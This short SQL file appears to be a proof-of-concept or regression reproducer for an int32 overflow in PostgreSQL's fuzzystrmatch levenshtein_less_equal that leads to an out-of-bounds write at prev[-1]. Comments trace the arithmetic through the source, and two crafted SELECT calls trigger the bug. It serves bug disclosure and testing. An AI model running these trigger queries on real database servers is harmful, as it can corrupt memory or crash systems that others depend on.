-- levenshtein_less_equal out-of-bounds write (upstream c4d51b6274), live at
-- the 17.5 pin.
--
-- The parameters are not guesses. levenshtein.c computes, all in int32:
--
--   :152  min_theo_d  = net_inserts * ins_c        net_inserts = n - m = 197
--                     = 197 * 715827883            overflows to a NEGATIVE value
--   :175  slack_d     = max_d - min_theo_d         max_d is large, min_theo_d is
--                                                  negative, so this overflows too
--   :178  stop_column = best_column + slack_d / (ins_c + del_c) + 1
--                     = -1
--   :179  if (stop_column > m) ...                 a ONE-SIDED clamp: -1 passes
--   :240  prev[stop_column] = max_d + 1            writes prev[-1]
--
-- Verified on a native 17.5 cluster on 2026-10-06: this returns -715827814.
-- A Levenshtein distance cannot be negative, so the returned value is itself
-- evidence that the overflow happened and was then used as data.
CREATE EXTENSION IF NOT EXISTS fuzzystrmatch;

-- signature: levenshtein_less_equal(source, target, ins_c, del_c, sub_c, max_d)
SELECT levenshtein_less_equal('abc', repeat('x', 200), 715827883, 1, 1, 2000000000);
SELECT levenshtein_less_equal('abc', repeat('x', 200), 715827883, 2, 1, 2147483647);
